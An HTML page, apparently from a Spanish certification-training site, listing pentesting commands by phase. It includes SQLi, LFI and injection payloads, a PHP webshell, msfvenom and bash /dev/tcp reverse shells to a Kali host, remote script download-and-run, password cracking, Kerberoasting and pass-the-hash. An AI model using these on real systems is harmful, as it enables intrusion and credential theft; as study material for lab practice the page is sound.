@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="es" data-root="">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chuleta de comandos · Academia eJPTv2</title>
+<meta name="description" content="Todos los comandos clave del pentesting en una página, ordenados por fase. Lista para imprimir.">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+<div class="layout">
+<aside class="sidebar"></aside>
+<main>
+<h1>⚡ Chuleta de comandos</h1>
+<p class="lead">Referencia rápida por fases. Reemplaza <code>IP</code>, <code>URL</code> y <code>10.0.2.15</code> (tu Kali) por los tuyos. Puedes imprimir esta página (Ctrl+P).</p>
+
+<h2>🔍 Reconocimiento</h2>
+<pre>whois dominio.com
+dig AXFR dominio.com @ns1.dominio.com      <span class="c"># transferencia de zona</span>
+theHarvester -d dominio.com -b all
+sublist3r -d dominio.com
+curl -s "https://crt.sh/?q=%25.dominio.com&output=json" | jq -r '.[].name_value' | sort -u</pre>
+
+<h2>📡 Escaneo (Nmap)</h2>
+<pre>nmap -sn 10.0.2.0/24                        <span class="c"># hosts vivos</span>
+nmap -p- --min-rate 5000 -T4 IP -oN all.txt  <span class="c"># todos los puertos</span>
+nmap -p22,80,445 -sC -sV -oN det.txt IP     <span class="c"># enumerar abiertos</span>
+nmap -sU --top-ports 50 IP                  <span class="c"># UDP</span>
+nmap -Pn IP                                 <span class="c"># sin ping (Windows)</span>
+nmap --script vuln IP</pre>
+
+<h2>🔎 Enumeración por servicio</h2>
+<pre><span class="c"># FTP 21</span>          ftp IP   (anonymous)
+<span class="c"># SMB 445</span>        enum4linux -a IP · smbclient -L //IP/ -N · smbmap -H IP
+<span class="c"># SMTP 25</span>        nc IP 25  → VRFY root
+<span class="c"># SNMP 161</span>       snmpwalk -v2c -c public IP
+<span class="c"># MySQL 3306</span>     mysql -h IP -u root
+<span class="c"># Web 80</span>         whatweb URL · nikto -h URL · gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt -x php,txt</pre>
+
+<h2>🌐 Web</h2>
+<pre>gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
+ffuf -u URL/FUZZ -w lista.txt -fc 404
+sqlmap -u "URL?id=1" --batch --dbs
+wpscan --url URL --enumerate u,vp
+<span class="c"># Payloads</span>
+SQLi login:   ' OR '1'='1' --
+LFI:          ?page=../../../../etc/passwd
+Cmd inject:   127.0.0.1; id
+Webshell PHP: &lt;?php system($_GET['cmd']); ?&gt;</pre>
+
+<h2>💥 Explotación / shells</h2>
+<pre>searchsploit servicio version
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f elf -o s
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=443 -f exe -o s.exe
+<span class="c"># Escuchar</span>          nc -lvnp 443
+<span class="c"># Reverse shell</span>     bash -i >& /dev/tcp/10.0.2.15/443 0>&1
+<span class="c"># Estabilizar</span>       python3 -c 'import pty;pty.spawn("/bin/bash")'  → Ctrl+Z → stty raw -echo; fg</pre>
+
+<h2>🔑 Contraseñas</h2>
+<pre>hashid 'HASH'
+hashcat -m 0 h.txt rockyou.txt      <span class="c"># 0=MD5 1000=NTLM 1800=sha512 13100=kerberoast 18200=asrep</span>
+john --wordlist=rockyou.txt h.txt
+hydra -l user -P rockyou.txt ssh://IP
+crackmapexec smb IP -u users.txt -p pass.txt</pre>
+
+<h2>⬆️ Privesc Linux</h2>
+<pre>sudo -l
+find / -perm -4000 -type f 2>/dev/null        <span class="c"># SUID → GTFOBins</span>
+getcap -r / 2>/dev/null
+cat /etc/crontab · ./pspy64
+uname -r ; searchsploit linux kernel X.X
+<span class="c"># automático</span>  wget http://10.0.2.15/linpeas.sh -O /tmp/l.sh; chmod +x /tmp/l.sh; /tmp/l.sh</pre>
+
+<h2>⬆️ Privesc Windows</h2>
+<pre>whoami /priv                          <span class="c"># SeImpersonate → PrintSpoofer/GodPotato</span>
+winPEASx64.exe
+reg query HKLM /f password /t REG_SZ /s
+cmdkey /list
+sc qc servicio                        <span class="c"># unquoted path / permisos</span>
+systeminfo                            <span class="c"># exploits por hotfix faltante</span></pre>
+
+<h2>🔀 Pivoting</h2>
+<pre>ssh -D 9050 user@pivote               <span class="c"># + proxychains</span>
+./chisel server -p 8000 --reverse     |  ./chisel client KALI:8000 R:socks
+./proxy -selfcert                     |  ./agent -connect KALI:11601 -ignore-cert
+sudo ip route add 172.16.5.0/24 dev ligolo</pre>
+
+<h2>🏛️ Active Directory</h2>
+<pre>crackmapexec smb IP -u u -p p --users --shares
+bloodhound-python -u u -p p -d dom.local -ns IP -c all
+impacket-GetNPUsers dom.local/ -usersfile users.txt -no-pass    <span class="c"># AS-REP</span>
+impacket-GetUserSPNs dom.local/u:p -request                     <span class="c"># Kerberoast</span>
+impacket-psexec dom.local/admin@IP -hashes :HASH                <span class="c"># PtH</span>
+impacket-secretsdump dom.local/admin@IP
+evil-winrm -i IP -u admin -H HASH</pre>
+
+<h2>📁 Transferencia de ficheros</h2>
+<pre><span class="c"># Kali</span>     python3 -m http.server 80
+<span class="c"># Linux</span>    wget http://10.0.2.15/f -O /tmp/f   ·   curl http://10.0.2.15/f -o /tmp/f
+<span class="c"># Windows</span>  certutil -urlcache -f http://10.0.2.15/f f   ·   iwr http://10.0.2.15/f -o f
+<span class="c"># Netcat</span>   nc -lvnp 9001 < f   |   nc 10.0.2.15 9001 > f</pre>
+</main>
+<nav class="toc"></nav>
+</div>
+<script src="assets/app.js"></script>
+</body>
+</html>
